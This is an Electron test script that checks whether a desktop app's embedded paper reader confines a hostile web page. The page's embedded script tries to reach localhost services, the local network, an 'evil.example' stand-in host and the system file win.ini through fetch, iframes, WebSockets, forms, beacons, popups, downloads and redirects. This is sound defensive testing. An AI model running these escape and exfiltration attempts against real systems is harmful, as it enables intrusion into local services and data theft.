/**
 * A hostile page in the embedded reader, inside a real Electron: does the confinement hold?
 *
 *     npx electron apps/desktop/reader.electron.cjs        (npm run test:reader in apps/desktop)
 *
 * reader.test.cjs checks the rules as functions. This runs them where they matter: it starts Electron with the
 * same two calls the app makes (reader-guard.cjs), shows a page in the reader that tries everything a page could
 * to reach this computer, the local network, another site and the app itself, and looks at what got through.
 *
 * Nothing leaves this computer: every https request the reader makes that the rules let through is answered
 * here (session.protocol.handle), which is also how the test sees what was let through. The "victim" is a
 * plain http server on this computer, standing in for the app's own interface, its API and the engine: it must
 * never hear from the page.
 *
 * Exit code 0 when everything held, 1 with the failures listed when not.
 */
const http = require("node:http");
const { app, BrowserWindow, session } = require("electron");
const { READER } = require("./reader.cjs");
const { readerGuard } = require("./reader-guard.cjs");

const PAGE = "https://arxiv.org/abs/hostile";
const PDF = "https://arxiv.org/pdf/hostile.pdf";
/** A site on no list, which the user (the test) agrees to open in the reader: it is just as hostile. */
const OTHER = "https://other-journal.example/article";

/** The smallest PDF a viewer opens: one empty page. */
const A_PDF = Buffer.from(
	"%PDF-1.1\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n" +
		"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n",
);

/** What the hostile page runs. `victim` is the port of the server on this computer it must not reach. */
function hostile(victim) {
	const attempt = `
		const told = { node: typeof require + "/" + typeof process + "/" + typeof module, tried: [] };
		const local = ["http://127.0.0.1:${victim}", "http://localhost:${victim}", "http://0.0.0.0:${victim}",
			"http://[::1]:${victim}", "http://app.localhost:${victim}", "http://127.0.0.2:${victim}",
			"https://127.0.0.1:${victim}", "http://[::ffff:127.0.0.1]:${victim}"];
		const elsewhere = ["https://evil.example", "https://evil-arxiv.org", "https://arxiv.org.evil.example",
			"https://www.google-analytics.com", "https://arxiv.org:8443", "https://192.168.1.1", "http://arxiv.org"];
		const allowed = ["https://static.arxiv.org/allowed.css", "https://cdn.jsdelivr.net/allowed.js"];
		const get = (address) => fetch(address, { mode: "no-cors" }).then(() => "sent", () => "stopped");
		const picture = (address) => new Promise((done) => {
			const image = new Image();
			image.onload = () => done("sent"); image.onerror = () => done("stopped"); image.src = address;
			setTimeout(() => done("no answer"), 1500);
		});
		const frame = (address) => new Promise((done) => {
			const inner = document.createElement("iframe");
			inner.onload = () => done("loaded"); inner.onerror = () => done("stopped"); inner.src = address;
			document.body.append(inner); setTimeout(() => done("no answer"), 1500);
		});
		const socket = (address) => new Promise((done) => {
			try {
				const ws = new WebSocket(address.replace(/^http/, "ws"));
				ws.onopen = () => done("sent"); ws.onerror = () => done("stopped");
			} catch { done("stopped"); }
			setTimeout(() => done("no answer"), 1500);
		});
		const post = (address) => new Promise((done) => {
			const inner = document.createElement("iframe"); inner.name = "sink" + Math.random();
			const form = document.createElement("form");
			form.method = "POST"; form.action = address; form.target = inner.name;
			document.body.append(inner, form); form.submit(); setTimeout(() => done("submitted"), 400);
		});
		(async () => {
			for (const base of [...local, ...elsewhere]) {
				told.tried.push([base, await get(base + "/fetch"), await picture(base + "/image.png"),
					await frame(base + "/frame"), await socket(base + "/socket"), await post(base + "/form")]);
				navigator.sendBeacon(base + "/beacon", "x");
			}
			told.file = [await get("file:///C:/Windows/win.ini"), await frame("file:///C:/Windows/win.ini")];
			told.allowed = [];
			for (const address of allowed) told.allowed.push(await get(address));
			try { told.popup = String(window.open("https://evil.example/popup")); } catch (error) { told.popup = "threw"; }
			try { told.geo = await navigator.permissions.query({ name: "geolocation" }).then((p) => p.state); } catch { told.geo = "threw"; }
			const link = document.createElement("a");
			link.href = "https://arxiv.org/download.bin"; link.download = "taken.bin"; document.body.append(link); link.click();
			await fetch("https://arxiv.org/told", { method: "POST", body: JSON.stringify(told) });
			location.href = "https://evil.example/taken-over";
		})();
	`;
	return `<!doctype html><title>hostile</title><body><script>${attempt}</script></body>`;
}

const wait = (ms) => new Promise((done) => setTimeout(done, ms));

async function main() {
	const failures = [];
	const check = (held, what) => {
		if (!held) failures.push(what);
	};

	// the victim: anything it hears is a failure
	const heard = [];
	const victim = http.createServer((request, response) => {
		heard.push(`${request.method} ${request.url}`);
		response.end("the app's own API");
	});
	await new Promise((done) => victim.listen(0, "127.0.0.1", done));
	const port = victim.address().port;

	const refused = [];
	// the user, as the test plays them: no to the site the hostile page sends the view to, yes to one they follow
	const asked = [];
	const outside = [];
	const guard = readerGuard({
		ask: async (host) => {
			asked.push(host);
			return host === "other-journal.example" ? "reader" : "no";
		},
		openOutside: (address) => outside.push(address),
		refusedRequest: (address, as) => refused.push(`${as} ${address}`),
	});
	const reader = guard.confineSession(session);
	// every https request the rules let through ends here, and nowhere else
	const let_through = [];
	let told = null;
	reader.protocol.handle("https", async (request) => {
		let_through.push(request.url);
		if (request.url === PAGE || request.url === OTHER) return new Response(hostile(port), { headers: { "content-type": "text/html" } });
		if (request.url === PDF) return new Response(A_PDF, { headers: { "content-type": "application/pdf" } });
		if (request.url === "https://arxiv.org/told") told = JSON.parse(await request.text());
		if (request.url.endsWith(".bin")) {
			return new Response("x", { headers: { "content-type": "application/octet-stream", "content-disposition": "attachment" } });
		}
		return new Response("ok", { headers: { "content-type": "text/plain", "access-control-allow-origin": "*" } });
	});
	let downloads = 0;
	reader.on("will-download", (_event, item) => {
		downloads += 1;
		item.once("done", (_done, state) => check(state !== "completed", `a download completed: ${item.getFilename()}`));
	});

	const window = new BrowserWindow({ show: false, width: 900, height: 700, webPreferences: { webviewTag: true } });
	guard.guardWindow(window);
	const attached = [];
	window.webContents.on("did-attach-webview", (_event, guest) => attached.push(guest));
	const view = (src, partition) => `<webview src="${src}" partition="${partition}" plugins="true" style="height:300px"></webview>`;
	const host = `<!doctype html><body>${view(PAGE, READER)}${view("https://evil.example/", READER)}${view(PAGE, "other")}
		${view("http://127.0.0.1:" + port + "/embedded", READER)}${view("file:///C:/Windows/win.ini", READER)}</body>`;
	await window.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(host)}`);

	for (let waited = 0; waited < 60_000 && told === null; waited += 250) await wait(250);
	check(told !== null, "the hostile page never finished (did it load at all?)");
	await wait(1500); // the page's last move: sending the view to another site

	check(attached.length === 1, `${attached.length} views were attached; only the one of a paper site in the reader's partition may be`);
	const guest = attached[0];
	check(heard.length === 0, `this computer was reached: ${heard.join(", ")}`);
	const known = /^https:\/\/((static\.)?arxiv\.org|cdn\.jsdelivr\.net)\//;
	const strangers = let_through.filter((address) => !known.test(address));
	check(strangers.length === 0, `requests to other sites were let through: ${strangers.join(", ")}`);
	for (const allowed of ["https://static.arxiv.org/allowed.css", "https://cdn.jsdelivr.net/allowed.js"]) {
		check(let_through.includes(allowed), `${allowed} is on the list but was stopped: paper pages would break`);
	}
	if (told) {
		check(told.node === "undefined/undefined/undefined", `the page has Node: ${told.node}`);
		check(told.geo !== "granted", "the page was granted the location");
		for (const [base, ...results] of told.tried) {
			const through = results.filter((result) => result === "sent" || result === "loaded");
			check(through.length === 0, `${base}: the page believes it got through (${results.join(", ")})`);
		}
		check(
			told.file.every((result) => result !== "sent" && result !== "loaded"),
			`a file was read: ${told.file.join(", ")}`,
		);
		check(
			told.allowed.every((result) => result === "sent"),
			`allowed hosts were stopped: ${told.allowed.join(", ")}`,
		);
	}
	check(guest?.getURL() === PAGE, `the view was sent to ${guest?.getURL()}`);
	check(asked.join() === "evil.example", `the user was asked about: ${asked.join(", ") || "nothing"} (once, about evil.example)`);
	check(outside.length === 0, `links were handed to the browser unasked: ${outside.join(", ")}`);
	check(BrowserWindow.getAllWindows().length === 1, "a second window was opened");
	check(downloads <= 1, `${downloads} downloads began`);

	// a paper's PDF still opens in the reader's built-in viewer under these rules
	const before = refused.length;
	if (guest) {
		await guest.loadURL(PDF).catch((error) => check(false, `the PDF did not load: ${error.message}`));
		await wait(2500);
		check(guest.getURL() === PDF, `after opening the PDF the view is at ${guest.getURL()}`);
	}
	const viewer = refused.slice(before);
	check(viewer.length === 0, `the PDF viewer was refused: ${viewer.join(", ")}`);

	// A site on no list that the user agrees to: it opens, in the same sandbox, and reaches no more than before.
	if (guest) {
		told = null;
		const seen = let_through.length;
		await guest.executeJavaScript(`location.href = ${JSON.stringify(OTHER)}`).catch(() => {});
		for (let waited = 0; waited < 60_000 && told === null; waited += 250) await wait(250);
		await wait(1500);
		check(asked.join() === "evil.example,other-journal.example", `asked about: ${asked.join(", ")}`);
		check(told !== null, "the approved site's page never finished");
		check(heard.length === 0, `from the approved site this computer was reached: ${heard.join(", ")}`);
		const beyond = let_through
			.slice(seen)
			.filter((address) => !known.test(address) && !address.startsWith("https://other-journal.example/"));
		check(beyond.length === 0, `the approved site reached other sites: ${beyond.join(", ")}`);
		check(told?.node === "undefined/undefined/undefined", `the approved site's page has Node: ${told?.node}`);
		check(guest.getURL() === OTHER, `after the approved site's last move the view is at ${guest.getURL()}`);
		check(asked.filter((host) => host === "evil.example").length === 1, "the user was asked again about a site they said no to");
	}

	console.log(
		JSON.stringify(
			{
				held: failures.length === 0,
				failures,
				refused: refused.length,
				asked,
				let_through,
				outside,
				downloads,
				sample_refused: refused.slice(0, 12),
			},
			null,
			1,
		),
	);
	victim.close();
	app.exit(failures.length === 0 ? 0 : 1);
}

app.whenReady().then(main, (error) => {
	console.error(error);
	app.exit(2);
});
